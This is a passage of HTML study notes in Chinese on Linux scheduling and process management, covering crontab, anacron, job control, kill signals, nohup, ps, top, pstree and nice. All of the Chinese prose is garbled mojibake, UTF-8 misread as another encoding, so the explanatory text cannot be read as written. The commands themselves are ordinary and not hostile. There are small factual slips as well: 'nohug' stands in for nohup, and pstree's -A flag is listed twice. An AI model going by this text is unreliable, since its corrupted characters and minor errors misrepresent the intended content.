å¿…é¡»è¦åœ¨ä¸åŒçš„ä»»åŠ¡ä¹‹é—´æ‰§è¡Œé¢‘ç¹çš„ä»»åŠ¡åˆ‡æ¢ã€‚</p><p>ä¸è®ºæ˜¯ crontab è¿˜æ˜¯ at, å…¶æœ€å°å•ä½éƒ½æ˜¯åˆ†é’Ÿï¼Œå³å®ƒä»¬çš„ä»»åŠ¡éƒ½æ˜¯â€æ¯åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡â€æ¥å¤„ç†ã€‚</p><h2 id="15-3-å¾ªç¯æ‰§è¡Œçš„è®¡åˆ’ä»»åŠ¡"><a href="#15-3-å¾ªç¯æ‰§è¡Œçš„è®¡åˆ’ä»»åŠ¡" class="headerlink" title="15.3 å¾ªç¯æ‰§è¡Œçš„è®¡åˆ’ä»»åŠ¡"></a>15.3 å¾ªç¯æ‰§è¡Œçš„è®¡åˆ’ä»»åŠ¡</h2><h3 id="15-3-1-ç”¨æˆ·çš„è®¾ç½®"><a href="#15-3-1-ç”¨æˆ·çš„è®¾ç½®" class="headerlink" title="15.3.1 ç”¨æˆ·çš„è®¾ç½®"></a>15.3.1 ç”¨æˆ·çš„è®¾ç½®</h3><p>å»ºç«‹å¾ªç¯ä»»åŠ¡éœ€ä½¿ç”¨ <code>crontab</code> è¿™ä¸ªå‘½ä»¤ã€‚</p><p>é…ç½®æ–‡ä»¶æœ‰:</p><ul><li><code>/etc/cron.allow</code></li><li><code>/etc/cron.deny</code><br>å‰è€…çš„ä¼˜å…ˆçº§åŒæ ·é«˜äºåè€…ã€‚</li></ul><p>ä½¿ç”¨ <code>crontab</code> å»ºç«‹è®¡åˆ’ä»»åŠ¡ä¹‹åï¼Œè¯¥é¡¹ä»»åŠ¡ä¼šè¢«è®°å½•åˆ° <code>/var/spool/cron/dmtsai</code> ä¸­ã€‚<code>cron</code> æ¯æ‰§è¡Œä¸€é¡¹ä»»åŠ¡éƒ½ä¼šè¢«è®°å½•åˆ° <code>/var/log/cron</code> è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ã€‚</p><p>è¯­æ³•:</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">crontab [-u username] [-l|<span class="hljs-type">-e</span>|<span class="hljs-type">-r</span>]<br></code></pre></td></tr></table></figure><p>é€‰é¡¹å’Œå‚æ•°:</p><ul><li>-u : åªæœ‰ root æ‰èƒ½æ‰§è¡Œè¿™ä¸ªä»»åŠ¡ï¼Œæˆ–è€…å¸®å…¶ä»–ä½¿ç”¨è€…å»ºç«‹&#x2F;åˆ é™¤ crontab ä»»åŠ¡</li><li>-e : edit, ç¼–è¾‘ crontab ä»»åŠ¡å†…å®¹</li><li>-l : list, æŸ¥çœ‹ crontab ä»»åŠ¡å†…å®¹</li><li>-r : remove, åˆ é™¤æ‰€æœ‰çš„ crontab ä»»åŠ¡å†…å®¹ï¼Œè‹¥ä»…åˆ é™¤ä¸€é¡¹ï¼Œä½¿ç”¨ <code>-e</code> é€‰é¡¹<br>æ¯é¡¹ä»»åŠ¡(å³æ¯è¡Œ)éƒ½æœ‰å…­ä¸ªå­—æ®µ:</li><li>åˆ†é’Ÿ, 0~59</li><li>å°æ—¶, 0~23</li><li>æ—¥æœŸ, 1~31</li><li>æœˆä»½, 1~12</li><li>å‘¨, 0~7</li><li>å‘½ä»¤<br>å‡ ä¸ªç‰¹æ®Šå­—ç¬¦:</li><li><code>*</code>, ä»»ä½•æ—¶å€™</li><li><code>,</code>, åˆ†éš”æ—¶æ®µ</li><li><code>-</code>, ä¸€æ®µæ—¶é—´</li><li><code>/n</code>, æ¯éš” n ä¸ªå•ä½</li></ul><h3 id="15-3-2-ç³»ç»Ÿçš„é…ç½®æ–‡ä»¶"><a href="#15-3-2-ç³»ç»Ÿçš„é…ç½®æ–‡ä»¶" class="headerlink" title="15.3.2 ç³»ç»Ÿçš„é…ç½®æ–‡ä»¶"></a>15.3.2 ç³»ç»Ÿçš„é…ç½®æ–‡ä»¶</h3><p><code>crontab -e</code> è¿™ä¸ª crontab æ˜¯ <code>/usr/bin/crontab</code> è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p><code>/etc/crontab</code> æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚</p><p>cron ä¼šæ¯åˆ†é’Ÿå»è¯»å–ä¸€æ¬¡ <code>/etc/crontab</code> å’Œ <code>/var/spool/cron</code> æ–‡ä»¶ã€‚</p><p>ç”±äº cron æ˜¯è¯»å–åˆ°å†…å­˜å½“ä¸­ï¼Œæ‰€ä»¥åœ¨ä¿®æ”¹å®Œ <code>/etc/crontab</code> è¿™ä¸ªæ–‡ä»¶åï¼Œå¯èƒ½ä¸ä¼šç«‹å³æ‰§è¡Œï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦é‡å¯ crond æœåŠ¡: <code>sudo systemctl restart crond</code>.</p><h3 id="15-3-3-ä¸€äº›æ³¨æ„äº‹é¡¹"><a href="#15-3-3-ä¸€äº›æ³¨æ„äº‹é¡¹" class="headerlink" title="15.3.3 ä¸€äº›æ³¨æ„äº‹é¡¹"></a>15.3.3 ä¸€äº›æ³¨æ„äº‹é¡¹</h3><h2 id="15-4-å¯å”¤é†’åœæœºæœŸé—´çš„å·¥ä½œä»»åŠ¡"><a href="#15-4-å¯å”¤é†’åœæœºæœŸé—´çš„å·¥ä½œä»»åŠ¡" class="headerlink" title="15.4 å¯å”¤é†’åœæœºæœŸé—´çš„å·¥ä½œä»»åŠ¡"></a>15.4 å¯å”¤é†’åœæœºæœŸé—´çš„å·¥ä½œä»»åŠ¡</h2><p><code>anacron</code> å‘½ä»¤ï¼Œæ‰§è¡Œæ—¶é—´åˆ°äº†ä½†å´æ²¡æœ‰æ‰§è¡Œçš„è®¡åˆ’ä»»åŠ¡ã€‚ä¹Ÿå°±æ˜¯è¯´, è¿‡äº† crontab éœ€è¦æ‰§è¡Œä»»åŠ¡çš„æ—¶é—´, ä½†æ˜¯ç”±äºå„ç§åŸå›  crontab å¹¶æ²¡æœ‰æ‰§è¡Œ, anacron å°±ä¼šæ£€æµ‹åˆ°è¿™ç±»æ²¡æœ‰è¢«æ‰§è¡Œçš„ä»»åŠ¡, å¹¶æ‰§è¡Œ.</p><h3 id="15-4-1-ä»€ä¹ˆæ˜¯-anacron"><a href="#15-4-1-ä»€ä¹ˆæ˜¯-anacron" class="headerlink" title="15.4.1 ä»€ä¹ˆæ˜¯ anacron"></a>15.4.1 ä»€ä¹ˆæ˜¯ anacron</h3><p>anacron ä¹Ÿæ˜¯æ¯å°æ—¶è¢« crond æ‰§è¡Œä¸€æ¬¡ï¼Œç„¶å anacron å†å»æ£€æµ‹ç›¸å…³çš„è®¡åˆ’ä»»åŠ¡æœ‰æ²¡æœ‰è¢«æ‰§è¡Œï¼Œå¦‚æœæœ‰è¶…è¿‡æœŸé™çš„ä»»åŠ¡åœ¨ï¼Œå°±æ‰§è¡Œè¯¥ä»»åŠ¡ï¼Œæ‰§è¡Œå®Œæ¯•æˆ–æ— éœ€æ‰§è¡Œä»»ä½•ä»»åŠ¡æ—¶ï¼Œanacron å°±åœæ­¢ã€‚</p><h1 id="ç¬¬16ç« -è¿›ç¨‹ç®¡ç†ä¸-SELinux-åˆæ¢"><a href="#ç¬¬16ç« -è¿›ç¨‹ç®¡ç†ä¸-SELinux-åˆæ¢" class="headerlink" title="ç¬¬16ç«  è¿›ç¨‹ç®¡ç†ä¸ SELinux åˆæ¢"></a>ç¬¬16ç«  è¿›ç¨‹ç®¡ç†ä¸ SELinux åˆæ¢</h1><p>Linux  å¾—ç¨‹åºé€šå¸¸ç§°ä¸º fork-and-exec çš„æµç¨‹ã€‚</p><p>è¿›ç¨‹éƒ½ä¼šå€Ÿç”±çˆ¶è¿›ç¨‹ä»¥å¤åˆ¶ (fork) çš„æ–¹å¼äº§ç”Ÿä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„å­è¿›ç¨‹ï¼Œç„¶åè¢«å¤åˆ¶å‡ºæ¥çš„å­è¿›ç¨‹å†ä»¥ exec çš„æ–¹å¼æ‰§è¡Œå®é™…è¦æ‰§è¡Œçš„è¿›ç¨‹ï¼Œæœ€ç»ˆå°±æˆä¸ºä¸€ä¸ªå­è¿›ç¨‹ã€‚</p><p>å¸¸é©»åœ¨å†…å­˜å½“ä¸­çš„è¿›ç¨‹é€šå¸¸éƒ½æ˜¯è´Ÿè´£ä¸€äº›ç³»ç»Ÿæ‰€æä¾›çš„åŠŸèƒ½ä»¥æœåŠ¡ç”¨æˆ·çš„å„é¡¹ä»»åŠ¡ï¼Œå› æ­¤è¿™äº›å¸¸é©»ç¨‹åºå°±è¢«ç§°ä¸º: æœåŠ¡ (daemon).</p><h2 id="16-1-2-Linux-çš„å¤šäººå¤šä»»åŠ¡ç¯å¢ƒ"><a href="#16-1-2-Linux-çš„å¤šäººå¤šä»»åŠ¡ç¯å¢ƒ" class="headerlink" title="16.1.2 Linux çš„å¤šäººå¤šä»»åŠ¡ç¯å¢ƒ"></a>16.1.2 Linux çš„å¤šäººå¤šä»»åŠ¡ç¯å¢ƒ</h2><p>åœ¨ Linux ä¸‹æ‰§è¡Œä¸€ä¸ªå‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šå°†ç›¸å…³çš„æƒé™ã€å±æ€§ã€è¿›ç¨‹ä»£ç ä¸æ•°æ®ç­‰å‡åŠ è½½åˆ°å†…å­˜ï¼Œå¹¶åŸºäºè¿™äº›è¿›ç¨‹ä¸€ä¸ªè¿›ç¨‹æ ‡è¯†ç¬¦(PID), æœ€ç»ˆè¯¥å‘½ä»¤å¯ä»¥æ‰§è¡Œçš„ä»»åŠ¡åˆ™ä¸è¿™ä¸ª PID çš„æƒé™æœ‰å…³ã€‚</p><h3 id="å¤šé‡ç™»å½•ç¯å¢ƒçš„ä¸ƒä¸ªåŸºæœ¬ç»ˆç«¯ç•Œé¢"><a href="#å¤šé‡ç™»å½•ç¯å¢ƒçš„ä¸ƒä¸ªåŸºæœ¬ç»ˆç«¯ç•Œé¢" class="headerlink" title="å¤šé‡ç™»å½•ç¯å¢ƒçš„ä¸ƒä¸ªåŸºæœ¬ç»ˆç«¯ç•Œé¢"></a>å¤šé‡ç™»å½•ç¯å¢ƒçš„ä¸ƒä¸ªåŸºæœ¬ç»ˆç«¯ç•Œé¢</h3><p>Linux ä¼šé»˜è®¤å¯åŠ¨å…­ä¸ªç»ˆç«¯ç™»å½•ç¯å¢ƒçš„è¿›ç¨‹ã€‚</p><h2 id="16-2-ä»»åŠ¡ç®¡ç†-job-control"><a href="#16-2-ä»»åŠ¡ç®¡ç†-job-control" class="headerlink" title="16.2 ä»»åŠ¡ç®¡ç† (job control)"></a>16.2 ä»»åŠ¡ç®¡ç† (job control)</h2><h3 id="16-2-1-ä»€ä¹ˆæ˜¯ä»»åŠ¡ç®¡ç†"><a href="#16-2-1-ä»€ä¹ˆæ˜¯ä»»åŠ¡ç®¡ç†" class="headerlink" title="16.2.1 ä»€ä¹ˆæ˜¯ä»»åŠ¡ç®¡ç†"></a>16.2.1 ä»€ä¹ˆæ˜¯ä»»åŠ¡ç®¡ç†</h3><p>æ”¾å…¥åå°çš„ä»»åŠ¡æ˜¯ä¸å¯ä»¥ç”¨ <code>ctrl + c</code> ç»ˆæ­¢çš„ã€‚</p><h3 id="16-2-2-job-control-çš„ç®¡ç†"><a href="#16-2-2-job-control-çš„ç®¡ç†" class="headerlink" title="16.2.2 job control çš„ç®¡ç†"></a>16.2.2 job control çš„ç®¡ç†</h3><p>bash åªèƒ½å¤Ÿç®¡ç†è‡ªå·±çš„ä»»åŠ¡è€Œä¸èƒ½ç®¡ç†å…¶ä»– bash çš„ä»»åŠ¡ã€‚</p><p>åœ¨å‘½ä»¤ååŠ ä¸Š <code>&amp;</code> ä»£è¡¨å°†è¯¥å‘½ä»¤ä¸¢åˆ°åå°ä¸­ï¼Œæ­¤æ—¶ bash ä¼šç»™äºˆè¿™ä¸ªå‘½ä»¤ä¸€ä¸ªä»»åŠ¡å·ç  (job number).</p><p>åˆ©ç”¨æ•°æ®æµé‡å®šå‘å¤„ç†è¾“å‡ºä¿¡æ¯:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ tar -zpcvf <span class="hljs-regexp">/tmp/</span>tec.tar.gz <span class="hljs-regexp">/etc &gt; /</span>tmp/log.txt <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br></code></pre></td></tr></table></figure><h4 id="å°†ç›®å‰ä»»åŠ¡ä¸¢åˆ°åå°ä¸­æš‚åœ-â€“-ctrl-z"><a href="#å°†ç›®å‰ä»»åŠ¡ä¸¢åˆ°åå°ä¸­æš‚åœ-â€“-ctrl-z" class="headerlink" title="å°†ç›®å‰ä»»åŠ¡ä¸¢åˆ°åå°ä¸­æš‚åœ â€“ ctrl + z"></a>å°†ç›®å‰ä»»åŠ¡ä¸¢åˆ°åå°ä¸­æš‚åœ â€“ ctrl + z</h4><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œä½¿ç”¨ [ctrl+z] ä¸¢åˆ°åå°çš„ç¨‹åºéƒ½æ˜¯æš‚åœçŠ¶æ€ã€‚</p><h4 id="æŸ¥çœ‹ç›®å‰åå°ä»»åŠ¡çŠ¶æ€"><a href="#æŸ¥çœ‹ç›®å‰åå°ä»»åŠ¡çŠ¶æ€" class="headerlink" title="æŸ¥çœ‹ç›®å‰åå°ä»»åŠ¡çŠ¶æ€"></a>æŸ¥çœ‹ç›®å‰åå°ä»»åŠ¡çŠ¶æ€</h4><p>ä½¿ç”¨ <code>jobs</code> å‘½ä»¤:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">jobs</span> [-lrs]</span><br></code></pre></td></tr></table></figure><p>å‡ ä¸ªå‚æ•°:</p><ul><li>-l : é™¤äº†åˆ—å‡º job number ä¸å‘½ä»¤ä¸²å¤–ï¼ŒåŒæ—¶åˆ—å‡º PID å·ç </li><li>-r : ä»…åˆ—å‡ºæ­£åœ¨åå° run çš„ä»»åŠ¡</li><li>-s : ä»…åˆ—å‡ºæ­£åœ¨åå° stop çš„ä»»åŠ¡<br>ä½¿ç”¨ <code>jobs -l</code> åï¼Œè§‚å¯Ÿ <code>+</code> <code>-</code> å·ï¼Œå…¶ä¸­ <code>+</code> ä»£è¡¨é»˜è®¤çš„ä½¿ç”¨ä»»åŠ¡ï¼Œä¹Ÿå°±æ˜¯è¯´ä»…è¾“å…¥ <code>fg</code> å°±ä¼šè¢«æ‹¿åˆ°å‰å°ä¸­æ¥å¤„ç†.</li></ul><h4 id="å°†åå°ä»»åŠ¡æ‹¿åˆ°å‰å°å¤„ç†ï¼š-fg"><a href="#å°†åå°ä»»åŠ¡æ‹¿åˆ°å‰å°å¤„ç†ï¼š-fg" class="headerlink" title="å°†åå°ä»»åŠ¡æ‹¿åˆ°å‰å°å¤„ç†ï¼š fg"></a>å°†åå°ä»»åŠ¡æ‹¿åˆ°å‰å°å¤„ç†ï¼š fg</h4><p>fg å³ foreground.</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">fg %</span>jobnumber<br></code></pre></td></tr></table></figure><p><code>jobnumber</code> æ˜¯ä»»åŠ¡å·ç ï¼Œå‰é¢çš„ <code>%</code> å¯æœ‰å¯æ— ã€‚</p><h4 id="è®©ä»»åŠ¡åœ¨åå°ä¸‹çš„çŠ¶æ€å˜æˆè¿è¡Œä¸­-bg"><a href="#è®©ä»»åŠ¡åœ¨åå°ä¸‹çš„çŠ¶æ€å˜æˆè¿è¡Œä¸­-bg" class="headerlink" title="è®©ä»»åŠ¡åœ¨åå°ä¸‹çš„çŠ¶æ€å˜æˆè¿è¡Œä¸­: bg"></a>è®©ä»»åŠ¡åœ¨åå°ä¸‹çš„çŠ¶æ€å˜æˆè¿è¡Œä¸­: bg</h4><p>è®© <code>Stopped</code> çš„ä»»åŠ¡å˜ä¸º <code>Running</code>.</p><h4 id="ç®¡ç†åå°å½“ä¸­çš„ä»»åŠ¡ï¼škill"><a href="#ç®¡ç†åå°å½“ä¸­çš„ä»»åŠ¡ï¼škill" class="headerlink" title="ç®¡ç†åå°å½“ä¸­çš„ä»»åŠ¡ï¼škill"></a>ç®¡ç†åå°å½“ä¸­çš„ä»»åŠ¡ï¼škill</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">kill</span> <span class="hljs-literal">-signal</span> %jobnumber<br><span class="hljs-variable">$</span> <span class="hljs-built_in">kill</span> <span class="hljs-literal">-l</span><br></code></pre></td></tr></table></figure><p>é€‰é¡¹å’Œå‚æ•°:</p><ul><li>-l : åˆ—å‡ºç›®å‰ kill èƒ½å¤Ÿä½¿ç”¨çš„ä¿¡å· (signal) æœ‰å“ªäº›</li><li>signal : ä»£è¡¨ç»™äºˆåé¢æ¥çš„é‚£ä¸ªä»»åŠ¡ä»€ä¹ˆæ ·çš„æŒ‡ç¤ºï¼Œå¯ä»¥ç”¨ <code>man 7 signal</code> æŸ¥è¯¢</li><li>-1 : é‡æ–°è¯»å–ä¸€æ¬¡å‚æ•°çš„é…ç½®æ–‡ä»¶</li><li>-2 : ä»£è¡¨ç”±é”®ç›˜è¾“å…¥ [ctrl]-c åŒæ ·çš„æ“ä½œ</li><li>-9 : ç«‹å³å¼ºåˆ¶åˆ é™¤ä¸€ä¸ªä»»åŠ¡</li><li>-15 : ä»¥æ­£å¸¸æ–¹å¼ç»ˆæ­¢ä¸€é¡¹ä»»åŠ¡</li></ul><h3 id="16-2-3-è„±æœºç®¡ç†é—®é¢˜"><a href="#16-2-3-è„±æœºç®¡ç†é—®é¢˜" class="headerlink" title="16.2.3 è„±æœºç®¡ç†é—®é¢˜"></a>16.2.3 è„±æœºç®¡ç†é—®é¢˜</h3><p>ä»»åŠ¡ç®¡ç†ä¸­çš„åå°æ˜¯ bash çš„åå°ï¼Œè€Œä¸æ˜¯ç³»ç»Ÿçš„åå°ã€‚</p><p>ä½¿ç”¨ <code>nohup</code> å‘½ä»¤, å…¶å¯ä»¥åœ¨è„±æœºæˆ–æ³¨é”€ç³»ç»Ÿåï¼Œè¿˜èƒ½å¤Ÿè®©ä»»åŠ¡ç»§ç»­æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">nohup</span> [å‘½ä»¤ä¸å‚æ•°] &lt;== åœ¨ç»ˆç«¯å‰å°ä¸­çš„ä»»åŠ¡</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">nohup</span> [å‘½ä»¤ä¸å‚æ•°] &lt;== åœ¨ç»ˆç«¯åå°ä¸­çš„ä»»åŠ¡</span><br></code></pre></td></tr></table></figure><p><code>nohug</code> å‘½ä»¤å¹¶ä¸æ”¯æŒ bash çš„å†…ç½®å‘½ä»¤ã€‚</p><p>ä½¿ç”¨ <code>nohug</code> çš„ä¿¡æ¯è¾“å‡ºä¼šè¢«é‡å®šå‘åˆ° <code>~/nohup.out</code></p><h2 id="16-3-è¿›ç¨‹ç®¡ç†"><a href="#16-3-è¿›ç¨‹ç®¡ç†" class="headerlink" title="16.3 è¿›ç¨‹ç®¡ç†"></a>16.3 è¿›ç¨‹ç®¡ç†</h2><h3 id="16-3-1-æŸ¥çœ‹è¿›ç¨‹"><a href="#16-3-1-æŸ¥çœ‹è¿›ç¨‹" class="headerlink" title="16.3.1 æŸ¥çœ‹è¿›ç¨‹"></a>16.3.1 æŸ¥çœ‹è¿›ç¨‹</h3><p><code>ps</code> å‘½ä»¤çš„ä¸¤ä¸ªå¸¸ç”¨é€‰é¡¹:</p><ul><li><code>ps -l</code> : æŸ¥çœ‹è‡ªå·± bash çš„è¿›ç¨‹</li><li><code>ps aux</code> : æŸ¥çœ‹æ‰€æœ‰ç³»ç»Ÿè¿è¡Œçš„è¿›ç¨‹</li></ul><p>ä¸€èˆ¬æ¥è¯´ <code>ps aux</code> ä¼šæŒ‰ç…§ PID çš„é¡ºåºæ¥æ’åºæ˜¾ç¤ºã€‚</p><p>å¦‚æœä½ å‘ç°æŸä¸ªè¿›ç¨‹çš„ CMD åé¢æ¥ä¸Šäº† <defunct> æ—¶ï¼Œå°±ä»£è¡¨è¯¥è¿›ç¨‹æ˜¯åƒµå°¸è¿›ç¨‹ã€‚</p><h4 id="top-åŠ¨æ€æŸ¥çœ‹è¿›ç¨‹çš„å˜åŒ–"><a href="#top-åŠ¨æ€æŸ¥çœ‹è¿›ç¨‹çš„å˜åŒ–" class="headerlink" title="top : åŠ¨æ€æŸ¥çœ‹è¿›ç¨‹çš„å˜åŒ–"></a>top : åŠ¨æ€æŸ¥çœ‹è¿›ç¨‹çš„å˜åŒ–</h4><p>ä½¿ç”¨æ–¹å¼:</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">$ <span class="hljs-built_in">top</span> [-dæ•°å­—] | <span class="hljs-type">top</span> [-bnp]<br></code></pre></td></tr></table></figure><p>å‚æ•°å’Œé€‰é¡¹:</p><ul><li><code>-d</code> : åé¢æ¥ç§’æ•°ï¼Œå°±æ˜¯æ•´ä¸ªè¿›ç¨‹ç•Œé¢æ›´æ–°çš„ç§’æ•°ã€‚é»˜è®¤æ˜¯5ç§’</li><li><code>-b</code> : ä»¥æ‰¹é‡çš„æ–¹å¼æ‰§è¡Œ top, é€šå¸¸æ­é…æ•°æ®æµé‡å®šå‘æ¥å°†æ‰¹é‡çš„ç»“æœè¾“å‡ºä¸ºæ–‡ä»¶</li><li><code>-n</code> : ä¸ <code>-b</code> æ­é…ï¼Œè¡¨ç¤ºæ‰§è¡Œå‡ æ¬¡ top çš„è¾“å‡ºç»“æœ</li><li><code>-p</code> : æŒ‡å®šæŸä¸ª PID æ¥æ‰§è¡ŒæŸ¥çœ‹ç›‘æµ‹<br><code>top</code> é»˜è®¤ä½¿ç”¨ CPU ä½¿ç”¨ç‡ä½œä¸ºæ’åºä¾æ®ï¼Œå¯æ¢ã€‚</li></ul><h4 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h4><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ pstree <span class="hljs-comment">[-A|U]</span> <span class="hljs-comment">[-up]</span><br></code></pre></td></tr></table></figure><p>é€‰é¡¹ä¸å‚æ•°:</p><ul><li>-A : å„è¿›ç¨‹æ ‘ä¹‹é—´çš„è¿æ¥ä»¥ ASCII çš„æ–¹å¼ </li><li>-U : å„è¿›ç¨‹æ ‘ä¹‹é—´çš„è¿æ¥ä»¥ Unicode çš„æ–¹å¼ </li><li>-p : åŒæ—¶åˆ—å‡ºæ¯ä¸ªè¿›ç¨‹çš„ PID</li><li>-A : åŒæ—¶åˆ—å‡ºæ¯ä¸ªè¿›ç¨‹çš„æ‰€å±è´¦å·åç§°</li></ul><h3 id="16-3-2-è¿›ç¨‹çš„ç®¡ç†"><a href="#16-3-2-è¿›ç¨‹çš„ç®¡ç†" class="headerlink" title="16.3.2 è¿›ç¨‹çš„ç®¡ç†"></a>16.3.2 è¿›ç¨‹çš„ç®¡ç†</h3><p>è¿›ç¨‹çš„ç®¡ç†æ˜¯é€šè¿‡ç»™äºˆè¯¥è¿›ç¨‹ä¸€ä¸ªä¿¡å· (signal) å»å‘ŠçŸ¥è¯¥è¿›ç¨‹ä½ æƒ³è¦è®©å®ƒåšä»€ä¹ˆã€‚</p><p>ä¸»è¦ä¿¡å·çš„ä»£å·ã€åç§°åŠå†…å®¹:</p><ul><li>1 SIGHUP å¯åŠ¨è¢«ç»ˆæ­¢çš„è¿›ç¨‹ï¼Œå¯è®©è¯¥ PID é‡æ–°è¯»å–è‡ªå·±çš„é…ç½®æ–‡ä»¶</li><li>2 SIGINT ç›¸å½“äºé”®ç›˜è¾“å…¥ [ctrl]-c æ¥ç»ˆæ­¢ä¸€ä¸ªè¿›ç¨‹</li><li>9 SIGKILL å¼ºåˆ¶ä¸­æ–­ä¸€ä¸ªè¿›ç¨‹çš„æ‰§è¡Œ</li><li>15 SIGTERM ä»¥æ­£å¸¸æ–¹å¼ç»“æŸè¿›ç¨‹çš„æ–¹å¼ç»ˆæ­¢è¿›ç¨‹</li><li>19 SIGSTOP ç›¸å½“äºé”®ç›˜è¾“å…¥ [ctrl]-z æ¥æš‚åœä¸€ä¸ªè¿›ç¨‹<br>ä½¿ç”¨:<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">kill</span> <span class="hljs-literal">-signal</span> PID<br></code></pre></td></tr></table></figure></li></ul><h4 id="é€šè¿‡å‘½ä»¤çš„å†…å®¹æ¥ç»ˆæ­¢è¿›ç¨‹-â€“-killall"><a href="#é€šè¿‡å‘½ä»¤çš„å†…å®¹æ¥ç»ˆæ­¢è¿›ç¨‹-â€“-killall" class="headerlink" title="é€šè¿‡å‘½ä»¤çš„å†…å®¹æ¥ç»ˆæ­¢è¿›ç¨‹ â€“ killall"></a>é€šè¿‡å‘½ä»¤çš„å†…å®¹æ¥ç»ˆæ­¢è¿›ç¨‹ â€“ killall</h4><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ killall <span class="hljs-comment">[-iIe]</span> <span class="hljs-comment">[-signal]</span> <span class="hljs-comment">[command name]</span><br></code></pre></td></tr></table></figure><p>å‚æ•°:</p><ul><li><code>-i</code> : interactive, åœ¨åˆ é™¤æ—¶ä¼šå‡ºç°æç¤ºå­—ç¬¦</li><li><code>-I</code> : å¿½ç•¥å¤§å°å†™</li><li><code>-e</code> : exact, è¡¨ç¤ºæ¥å®Œæ•´å‘½ä»¤ï¼Œä½†ä¸èƒ½è¶…è¿‡ 15 ä¸ªå­—ç¬¦, å¦‚ <code>/bin.bash</code> æ˜¯å®Œæ•´çš„ï¼Œ<code>bash</code> ä¸ç®—å®Œæ•´</li></ul><p>å…¶å¯ä»¥å°†ç³»ç»Ÿå½“ä¸­æ‰€æœ‰ä»¥æŸä¸ªå‘½ä»¤å¯åŠ¨çš„è¿›ç¨‹å…¨éƒ¨åˆ é™¤ã€‚</p><h3 id="16-3-3-å…³äºè¿›ç¨‹çš„æ‰§è¡Œé¡ºåº"><a href="#16-3-3-å…³äºè¿›ç¨‹çš„æ‰§è¡Œé¡ºåº" class="headerlink" title="16.3.3 å…³äºè¿›ç¨‹çš„æ‰§è¡Œé¡ºåº"></a>16.3.3 å…³äºè¿›ç¨‹çš„æ‰§è¡Œé¡ºåº</h3><p>éœ€è€ƒè™‘è¿›ç¨‹çš„ä¼˜å…ˆçº§ (priority) å’Œ CPU è°ƒåº¦ã€‚</p><h4 id="Priority-å’Œ-Nice-å€¼"><a href="#Priority-å’Œ-Nice-å€¼" class="headerlink" title="Priority å’Œ Nice å€¼"></a>Priority å’Œ Nice å€¼</h4><p>Linux ç»™äºˆè¿›ç¨‹ä¸€ä¸ªä¼˜å…ˆçº§ (Priority, PRI), PRI å€¼è¶Šä½ä»£è¡¨è¶Šä¼˜å…ˆ.</p><p>å¦‚æœè¦è°ƒæ•´è¿›ç¨‹çš„ä¼˜å…ˆçº§ï¼Œå°±è¦é€šè¿‡ nice å€¼ï¼Œå³ NI.</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PRI <span class="hljs-comment">(new)</span> = PRI <span class="hljs-comment">(old)</span> + <span class="hljs-symbol">NI</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„é¡¹:</p><ul><li>nice å€¼å¯è°ƒæ•´èŒƒå›´ä¸º -20 ~ 19</li><li>root å¯éšæ„è°ƒæ•´è‡ªå·±æˆ–å®ƒäººçš„è¿›ç¨‹çš„ nice å€¼ï¼Œä¸”èŒƒå›´ä¸º -20 ~ 19</li><li>ä¸€èˆ¬ç”¨æˆ·ä»…å¯è°ƒæ•´è‡ªå·±è¿›ç¨‹çš„ nice å€¼ï¼Œä¸”èŒƒå›´ä¸º 0 ~ 19</li><li>ä¸€èˆ¬ç”¨æˆ·ä»…å¯å°† nice å€¼è°ƒé«˜</li></ul><h4 id="nice-æ–°æ‰§è¡Œçš„å‘½ä»¤å³ç»™äºˆ-nice-å€¼"><a href="#nice-æ–°æ‰§è¡Œçš„å‘½ä»¤å³ç»™äºˆ-nice-å€¼" class="headerlink" title="nice : æ–°æ‰§è¡Œçš„å‘½ä»¤å³ç»™äºˆ nice å€¼"></a>nice : æ–°æ‰§è¡Œçš„å‘½ä»¤å³ç»™äºˆ nice å€¼</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">nice</span> [-n æ•°å­—] <span class="hljs-built_in">command</span></span><br></code></pre></td></tr></table></figure><h4 